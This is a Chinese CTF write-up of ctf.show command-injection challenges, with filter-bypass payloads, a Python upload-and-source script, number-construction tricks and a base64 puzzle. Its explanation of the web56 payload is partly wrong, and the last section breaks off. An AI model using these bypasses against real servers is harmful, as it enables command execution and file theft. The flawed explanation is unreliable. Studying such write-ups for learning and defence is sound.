- ​**绕过逻辑**​：在 CTF 题目中，最常用的 `cat`​、`more`​、`head`​、`tail`​ 等读取文件的命令通常会被第一时间过滤掉。`nl`​ 作为一个相对冷门的文件查看命令，经常能逃过黑名单的拦截，成为 `cat`​ 的完美替代品。
**2.** ${IFS}​**：绕过空格的限制**

- ​**作用**​：在 Linux 的 Bash 环境中，`$IFS`​ 是一个内置变量，代表“内部字段分隔符”（Internal Field Separator），它的默认值就包含了空格。
- ​**绕过逻辑**​：题目通常会把空格直接过滤，导致你无法用 `nl /flag`​ 这样的常规写法。使用 `${IFS}`​ 可以完美替代空格的作用。当命令执行时，Shell 会自动把 `${IFS}`​ 解析成一个空格，从而让 `nl`​ 和后面的文件路径正确隔开。
**3.** /fl''ag​**：绕过关键词过滤并指定路径**

- ​**作用**​：指定要读取的文件名。
- ​**绕过逻辑**​：
  - ​**绕过关键词**​：题目通常会把 `flag`​ 这个敏感词直接拉黑。利用我们之前聊过的引号拼接原理，`fl''ag`​ 在 PHP 的正则过滤眼里是“fl”+“两个单引号”+“ag”，成功绕过了对连续字符串 `flag`​ 的检测。等命令真正到了 Linux 系统里，两个空单引号消失，又变回了 `flag`​。
  - ​**指定根目录**​：前面的 `/`​ 表示直接去 Linux 的**根目录**下寻找这个文件。很多 CTF 题目为了增加难度，不会把 flag 放在当前的网页目录下，而是藏在根目录里（比如 `/flag`​ 或 `/fl''ag`​）。
**4.** ||​**：截断后面的“黑洞”指令**

- ​**作用**​：`||`​ 是 Linux 中的逻辑“或”运算符。
- ​**绕过逻辑**​：这道题（以及很多类似的题）的后端代码通常是 `system($c." &gt;/dev/null 2&gt;&amp;1");`​。这意味着无论你前面执行什么命令，输出结果都会被重定向到 `/dev/null`​（Linux 的黑洞，什么都看不见）。加上 `||`​ 之后，整个命令变成了 `nl${IFS}/fl''ag || &gt;/dev/null 2&gt;&amp;1`​。它的逻辑是：“先执行前面的 `nl`​ 命令，如果前面的命令执行成功（返回真），那么后面的 `/dev/null`​ 就不再执行了”。这样就成功保住了我们想要的回显结果。
**总结一下：**
这串 Payload 翻译成人类语言就是：“​**用** nl​ **命令（代替 cat），通过变量（代替空格）去读取根目录下的** flag​ **文件（绕过关键词检测），并且强行截断后面的屏蔽指令（保证能看到结果）。**​”
### web53

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
} 
```

对比之前的


```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```


```php
<br>是换行的意思
```

区别是现在会把你的命令在页面上输出回来，所以现在不需要使用||了

?c=ta''c${IFS}fla''g.php
### web54

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

这种的意思是cat，c1234a1234t，这类只要按照c a t的顺序出现的都会被过滤

cat和tac都被过滤了

**使用/bin/ta?同样可以运行tac命令**

?c=/bin/ta?${IFS}f???.???

得到了一堆乱码，查看源码在最后找到flag





在 URL 中使用 `/bin/ta?`​ 能够成功运行 `tac`​ 命令，主要利用了 Linux Shell 的**通配符匹配机制**以及​**URL 的解析规则**​。具体原理如下：

**Linux Shell 的通配符（Wildcard）机制**在 Linux 系统中，`?`​ 是一个特殊的通配符，它的作用是**匹配任意单个字符**（且该字符必须存在，不能为空）。 当你在 Shell（命令行）中输入 `/bin/ta?`​ 时，Shell 在执行命令之前，会先进行路径扩展。它会去 `/bin/`​ 目录下查找所有以 `ta`​ 开头，并且后面紧跟任意一个字符的文件。 由于 Linux 系统中存放 `tac`​ 命令的绝对路径恰好是 `/bin/tac`​，它完美符合 `ta`​ + `任意单个字符(c)`​ 的规则。因此，Shell 会自动将 `/bin/ta?`​ 匹配并扩展为 `/bin/tac`​，最终系统实际执行的命令就是 `/bin/tac`​。
### web55

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 
```

过滤了字母

没有过滤加号，没有过滤~，^,我想可以异或，自增，取反来做。

我看了wp后发现我的想法太复杂了，可以使用数字进行**无字母命令执行**

1.最简单的思路

/???/????64 ????.???

/bin/base64 flag.php

base64这个命令是把php内容以base64输出，根据wp作者提示，有些可能用不了

2.还有更高级的

/???/???/????2 ????.???

/usr/bin/bzip2 flag.php   这是把这个文件压缩了

再访问url+flag.php.bz2会直接下载压缩后的文件🫨有点好玩

3.$'\154\163'=ls

丢给ai让他来转换

$'\xxx\xxx\xxx\xxx'原理

​`$'\xxx\xxx\xxx\xxx'`​ 这种写法，在 Linux Bash 环境中有一个非常专业的术语，叫做 ​**ANSI-C 引号（ANSI-C Quoting）**​。

它的核心原理其实非常简单，就是**“披着数字外衣的字符翻译器”**。我们可以从以下三个维度来彻底拆解它：

### 1. 核心语法拆解

- ​$'...'​**（翻译开关）**​：这是 Bash 的一个特殊语法。它的作用是告诉系统：“请把单引号里面的内容，按照 C 语言的标准进行转义（翻译）”。普通的单引号 `'...'`​ 里面的内容会被当成纯文本，而加上 `$`​ 之后，引号里的转义序列就会被激活。
- ​\xxx​**（字符的八进制伪装）**​：这里的 `\`​ 是转义符，后面的 `xxx`​ 是 ​**1到3位的八进制数字**​。每一个八进制数字都对应 ASCII 码表里的一个真实字符。
  - 比如：`a`​ 的 ASCII 码十进制是 97，换算成八进制就是 `141`​。所以 `\141`​ 就会被 Bash 还原成 `a`​。
### 2. 它是怎么一步步执行的？

当你输入 `$'\143\141\164'`​ 并按下回车时，Bash 在底层做了以下动作：

- ​**识别开关**​：Bash 发现了 `$'...'`​ 结构，知道这里面藏着需要翻译的暗号。
- ​**查表翻译**​：它依次读取里面的八进制数：
  - ​`\143`​ -> 查 ASCII 表 -> 翻译为 `c`​
  - ​`\141`​ -> 查 ASCII 表 -> 翻译为 `a`​
  - ​`\164`​ -> 查 ASCII 表 -> 翻译为 `t`​
- ​**还原执行**​：翻译完成后，这串代码在内存中变成了 `cat`​。随后，Bash 把它当作一个正常的系统命令去执行。
### 3. 为什么它能绕过 WAF（防火墙）？

这就是它在 CTF 和漏洞利用中最大的价值所在：

- ​**视觉欺骗**​：对于很多简单的防火墙或代码过滤器来说，它们只会在黑名单里查找 `cat`​、`ls`​、`bash`​ 这样的​**明文字母**​。
- ​**完美绕过**​：而 `$'\143\141\164'`​ 里面​**一个字母都没有**​，只有数字、反斜杠和引号。防火墙看了一眼觉得“这只是一串奇怪的数字，不是危险命令”，于是放行。等流量到了服务器底层，Bash 才会把它还原成真正的 `cat`​ 命令执行。
**💡 补充一个小知识：**除了八进制（`\xxx`​），这种语法其实也支持十六进制（`\xhh`​）。 比如 `A`​ 的十六进制 ASCII 码是 `41`​，所以 `$'\x41'`​ 同样会被翻译成 `A`​。但在 CTF 的无字母命令执行中，八进制因为字符长度和绕过特性的优势，被使用得更加频繁。
### 为什么在网页里面能够执行linux命令

**Linux Bash 环境绝对不是普通网页的一般环境。**

我们平时上网浏览网页（普通网页环境），是通过浏览器（Chrome、Edge等）发送请求，服务器上的 Web 软件（如 Nginx、Apache）接收请求后，返回 HTML、CSS 等文件，浏览器再把这些代码渲染成你看到的精美页面。

而你在 CTF 题目或漏洞利用中遇到的“URL 命令执行”，是因为目标网站的代码存在严重的​**安全漏洞**​。攻击者（或解题者）通过精心构造的 URL，欺骗了服务器，让服务器在后台偷偷调用了 Linux 的 Bash 环境去执行你指定的系统命令。

为了让你更清晰地理解，我们可以从以下三个方面来拆解：

### 1. 本质上的天壤之别

- ​**普通网页环境（浏览器端）**​： 你看到的网页是运行在**你的电脑浏览器**里的。浏览器是一个高度受限制的“沙盒”环境，它只能负责展示页面、播放视频或运行前端的 JavaScript 代码，**绝对没有权限**去操作服务器底层的 Linux 系统，更不能随意调用 Bash 执行命令（否则你的电脑早就被网页病毒攻陷了）。
- ​**URL 命令执行环境（服务器端）**​： 这发生在**远程的 Linux 服务器**上。当 URL 中的命令被执行时，意味着服务器端的 Web 应用程序（比如用 PHP、Python 写的网站后台）调用了系统级的函数（例如 PHP 中的 `system()`​, `exec()`​, `shell_exec()`​ 等）。这些函数会直接唤醒服务器底层的 Bash，去执行你传入的指令。
### 2. 为什么 URL 命令执行都在 Bash 环境里？

因为绝大多数提供 Web 服务的服务器，底层运行的都是 Linux 操作系统，而 ​**Bash 正是 Linux 系统默认的“指挥官”（命令解释器）**​。

当 Web 应用程序需要调用系统命令时，它的执行流程是这样的：

- ​**Web 程序**​（如 PHP）接收到你的恶意请求。
- Web 程序调用系统函数（如 `system($c)`​）。
- 操作系统接收到调用请求，启动默认的 ​**Shell（也就是 Bash）**​。
- **Bash** 解析你传入的字符串（比如我们之前聊的 `$'\154\163'`​），然后去执行真正的 Linux 命令。
所以，并不是 URL 天生就能执行 Bash 命令，而是因为服务器底层是 Linux，且 Web 程序存在漏洞，把控制权交给了 Bash。

### 3. 一个直观的对比

| 特性 | 普通网页浏览 | URL 命令执行 (CTF/漏洞场景) |
| --- | --- | --- |
| 发生位置 | 你的本地电脑（浏览器） | 远程的 Linux 服务器后台 |
| 执行者 | 浏览器渲染引擎 | Linux 系统的 Bash 解释器 |
| 权限范围 | 仅限网页内容展示，无法触碰系统 | 拥有服务器当前用户的系统权限（如读写文件） |
| 触发原因 | 正常的网页访问 | 网站代码存在安全漏洞（如未过滤用户输入） |

**总结一下：**你在 URL 里执行 Bash 命令，本质上是在​**远程操控服务器后台的 Linux 终端**​。这在正常的互联网产品中是绝对不允许出现的严重安全漏洞（通常被称为 RCE，远程命令/代码执行漏洞），但在 CTF 比赛中，它被设计成一种考察你对 Linux Bash 底层原理和系统安全理解的经典题型。
### web56

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

神了 现在需要全新的方法来解决他

看了wp需要脚本上传一个文件，然后执行文件里面的命令，文件里面写cat flag.php


```python
import time
import requests

url = "http://7c7374da-7245-4232-8215-59ae33ec2825.challenge.ctf.show/"
payload = {"c":". /???/????????[@-[]"}


with open('.\\1.txt','r') as file:
    files = {'file': file}
    while 1:
        r = requests.post(url,params=payload,files=files)

        if r.text:
            print("\n" + r.text)
            break

        time.sleep(1)
        print(".", end=' ',flush=True)
```

注意

1.要使用http，https会因为安全证书报错

2.要把正在运行的网址也改成http



```python
import time
import requests

# CTF 题目的目标网址
url = "http://7c7374da-7245-4232-8215-59ae33ec2825.challenge.ctf.show/"

# 核心 Payload：利用 Linux 通配符和 . 命令来绕过无字母数字限制
# . 相当于 source，会执行后面的文件内容
# /???/ 匹配 /bin/ 目录
# ????????[@-[] 尝试匹配 printenv 等带有特定字符的命令
payload = {"c":". /???/????????[@-[]"}

# 打开当前目录下的 1.txt 文件（里面通常写的是 cat flag.php 等真实命令）
with open('.\\1.txt','r') as file:
    # 构造符合 HTTP 协议的文件上传格式，字段名为 'file'
    files = {'file': file}
    
    # 开启死循环，不断向服务器发送请求（盲打）
    while 1:
        # 发送 POST 请求，带上 payload 参数和上传的文件
        r = requests.post(url,params=payload,files=files)

        # 如果服务器返回了内容（r.text 不为空），说明可能打到了 flag
        if r.text:
            print("\n" + r.text)  # 把服务器返回的内容打印出来
            break  # 拿到结果后，退出循环，脚本结束

        # 每次请求间隔 1 秒，防止请求频率过高
        time.sleep(1)
        # 在控制台打印一个点和空格，表示脚本正在正常运行中
        print(".", end=' ',flush=True)
```



### 🛠️ 脚本 Payload 原理解析

脚本中的核心 Payload 是：`. /???/????????[@-[]`​，它利用了 Linux Bash 的几个高级特性：

- ​.​ **(点命令)**​：
  在 Linux Bash 中，`.`​（点号）等同于 `source`​ 命令。它的作用是读取后面的文件，并将文件的内容​**当作 Bash 命令在当前 Shell 环境中执行**​。这就完美绕过了无法直接输入命令字母的限制。
- ​/???/​ **(路径通配)**​：
  Linux 的系统命令通常存放在 `/bin/`​ 或 `/usr/bin/`​ 目录下。`/???/`​ 正好可以匹配到 `/bin/`​（3个问号匹配3个任意字符）。
- ​????????​ **(命令名通配)**​：
  这里匹配的是 8 个字符的命令。在 `/bin/`​ 目录下，刚好有一个命令叫 ​printenv​（正好是8个字母）。`printenv`​ 的作用是打印出系统的环境变量。
- ​[@-[]​ **(字符范围通配)**​：
  这是 Linux 的​**字符范围扩展**​。`[@-[]`​ 会匹配 ASCII 码在 `@`​ 到 `[`​ 之间的字符（包括 `@`​, `A`​, `B`​ ... `Z`​, `[`​）。
  在 `/bin/`​ 目录下，很多命令都是小写的（如 `cat`​, `ls`​），但 `printenv`​ 可以打印环境变量。而很多系统的环境变量（如 `PATH`​, `PWD`​, `SHLVL`​ 等）的值中，往往包含了大写字母。
**Payload 组合起来的含义：**
​`. /???/????????[@-[]`​ 实际上是在尝试执行类似 `. /bin/printenvA`​ 或 `. /bin/printenvP`​ 的命令。如果系统中存在以 `printenv`​ 开头且第九个字符在 `@`​ 到 `[`​ 范围内的可执行文件，Bash 就会执行它。

### 🚀 为什么还要配合文件上传（`files=files`​）？

这道题的终极解法通常是**“环境变量注入”​**或**​“利用上传文件”**。

- 脚本通过 `POST`​ 请求上传了一个名为 `1.txt`​ 的文件。
- 在 Linux 的某些 Web 环境下（如 PHP-FPM），上传的临时文件路径可能会包含一些随机的字母，或者我们可以通过某种方式将恶意的系统命令（比如 `cat flag.php`​）写入到某个环境变量或特定的临时文件中。
- 当 `. /bin/printenv...`​ 被执行时，它会打印出当前的环境变量。如果 flag 或者能够读取 flag 的命令被巧妙地藏在了环境变量里，或者这个 `printenv`​ 的执行触发了某些包含 flag 的脚本，flag 就会直接回显在响应包 `r.text`​ 中。
- 脚本中的 `while 1`​ 循环和 `time.sleep(1)`​ 是一种“盲打”或“轮询”的策略，不断发送 Payload 并上传文件，一旦服务器返回了包含 flag 的文本（`if r.text:`​），就打印出来并退出。
**总结一下：**
这个脚本是在利用 Linux 的 .​ **命令执行** + **路径通配符** + ​**字符范围扩展**​，试图在完全不能输入字母和数字的绝境下，强行调用系统自带的 `printenv`​ 等命令，配合文件上传带来的环境变量或临时文件路径变化，来间接获取 flag。这是 CTF 中非常硬核且巧妙的一种绕过思路！
### web57

```php
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
} 
```

需要构造36




​`$(())`​ 是 Linux Bash Shell 中的**算术扩展（Arithmetic Expansion）**语法，专门用来进行整数运算。在 CTF 的无字母数字命令执行（RCE）题目中，它是绕过数字过滤的绝对神器。

### 🛠️ 核心原理：如何凭空构造数字？

它的核心玩法基于以下三个 Bash 特性：

- ​$(())​ **或** $((0))​ **的值为** 0​：即使里面什么都不写，它的默认值也是 0。
- ​~​ **是按位取反运算符**​：在计算机中，对 `0`​ 进行取反运算（`~0`​），结果会变成 `-1`​。
- ​**加减法运算**​：在 `$(())`​ 里，多个数字连在一起默认是做加法（例如 `$((-1-1))`​ 等于 `-2`​）。
**推导公式如下：**

- ​`$(())`​ = **0**
- ​`$((~$(())))`​ = ** -1 ** （对 0 取反）
- ​`$((~$(())))$((~$(())))`​ = ** -2 ** （即 -1 + -1）
- 以此类推，只要不断叠加 `$((~$(())))`​，就能构造出任意负数。
- 最后，再在最外层套一个 `~`​ 进行取反，就能把负数变回我们想要的正整数（例如 `~(-37)`​ = ​**36**​）。
### 🎯 实战演示：如何构造数字 36？

假设题目过滤了所有数字，但你需要读取 `36.php`​ 里的 flag。根据上面的原理，我们需要先构造出 ​**-37**​，然后对它取反得到 ​**36**​。

**具体步骤：**

- 拿出一个 `$((~$(())))`​，它代表 `-1`​。
- 连续写 **37** 个 `$((~$(())))`​ 并把它们放在一起相加，得到 `-37`​。
- 在最外面套上 `$((~ ... ))`​ 进行最终取反。
**最终构造出 36 的 Payload 如下：**


```bash
$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
```

(这段代码看着很长很吓人，但本质上就是 37 个 -1 相加后再取反)

### 📝 通用构造公式与脚本

如果你想构造任意想要的数字 ​**N**​，通用的 Payload 模板是：
​`$((~$( (N+1)个$((~$(()))) 相加 )))`​

手动去数 37 个肯定很麻烦，你可以用 Python 快速生成任意数字的 Payload：


```python
# 比如你想构造数字 36
target_num = 36
# 需要构造的负数是 -(target_num + 1)
negative_num = -(target_num + 1)

# 生成对应数量的 -1 相加
payload = "$((~$(" + "$((~$(())))" * abs(negative_num) + ")))"
print(payload)
```

把生成的这段 Payload 放到题目中（例如 `?c=cat $((~$...)).php`​），就能完美绕过数字过滤，读取到你想要的文件啦！




查看源码才能看见flag哦
### 0取反得到-1的原理

在计算机的底层世界里，0 取反变成 -1 并不是魔法，而是由**二进制按位取反**和**补码（Two's Complement）**的数学规则共同决定的。我们可以通过以下三个步骤来彻底理解这个过程：

### 💡 1. 直观表现：按位取反（~）

在计算机中，数字是以二进制（0和1）的形式存储的。

- ​**0 的二进制**​：无论计算机用 8 位、32 位还是 64 位来存储，0 的每一位全都是 0。
  以 8 位为例：`0000 0000`​
- ​**按位取反操作（~）**​：就是简单粗暴地把所有的 0 变成 1，所有的 1 变成 0。
  对 0 取反后：`1111 1111`​
现在问题来了：计算机看到 `1111 1111`​ 这串二进制时，为什么认为它是 -1 呢？这就涉及到计算机存储负数的规则——补码。

### 🧮 2. 核心规则：补码（Two's Complement）

现代计算机为了简化硬件设计（让加法器也能做减法），统一使用**补码**来表示有符号整数。补码的核心规则是：

- ​**最高位是符号位**​：0 代表正数，1 代表负数。
- ​**负数的绝对值计算**​：如果你看到一个最高位是 1 的二进制数（负数），想知道它具体是负几，需要**再次对它进行“取反加一”**的操作。
我们来看看 `1111 1111`​ 是怎么被解读为 -1 的：

- ​**看符号位**​：最高位是 `1`​，说明这是一个负数。
- ​**求绝对值**​：对 `1111 1111`​ 进行“取反加一”。
  - 取反：`0000 0000`​
  - 加一：`0000 0000`​ + 1 = `0000 0001`​ （也就是十进制的 1）
- ​**得出结论**​：符号是负，绝对值是 1，所以 `1111 1111`​ 就是 ​**-1**​。
### 📐 3. 数学公式：~x = -(x + 1)

从数学推导上，按位取反运算有一个通用的恒等式：​~x = -(x + 1)​。
这个公式对任何整数都成立，我们可以直接套用来验证：

- 当 x = 0 时：`~0 = -(0 + 1) = -1`​
- 当 x = 5 时：`~5 = -(5 + 1) = -6`​
- 当 x = -5 时：`~-5 = -(-5 + 1) = -(-4) = 4`​
所以，0 取反得到 -1，既是二进制位翻转的直接结果，也是计算机补码数学体系的必然规律。
### web58

## 综合题

### base64多层嵌套

```php
 document.getElementById('loginForm').addEventListener('submit', function(e) {
            const correctPassword = "SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU=";
            
            function validatePassword(input) {
                let encoded = btoa(input);
                encoded = btoa(encoded + 'xH7jK').slice(3);
                encoded = btoa(encoded.split('').reverse().join(''));
                encoded = btoa('aB3' + encoded + 'qW9').substr(2);
                return btoa(encoded) === correctPassword;
            }

            const enteredPassword = document.getElementById('password').value;
            const messageElement = document.getElementById('message');
            
            if (!validatePassword(enteredPassword)) {
                e.preventDefault();
                messageElement.textContent = "Login failed! Incorrect password.";
                messageElement.className = "message error";
            }
        });
```

反着来

SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU= 解码得到  IzUFQxM1UzRmtSRk0wU2xSU05qRXdUVVk9cVc5

substr(2)是去掉前两个

IzUFQxM1UzRmtSRk0wU2xSU05qRXdUVVk9cVc5 = btoa('aB3' + encoded + 'qW9').substr(2)

xxIzUFQxM1UzRmtSRk0wU2xSU05qRXdUVVk9cVc5解码得ǒ3PT13U3FkRFM0SlRSNjEwTUY=qW9

去掉qw9和前面的3   PT13U3FkRFM0SlRSNjEwTUY=

解码得==wSqdDS4JTR610MF

倒过来FM016RTJ4SDdqSw==

XXXFM016RTJ4SDdqSw==解码ǜE3MzE2xH7jK

ǜE3MzE2

在 Base64 编码中，每 4 个字符解码后会变成 3 个字节。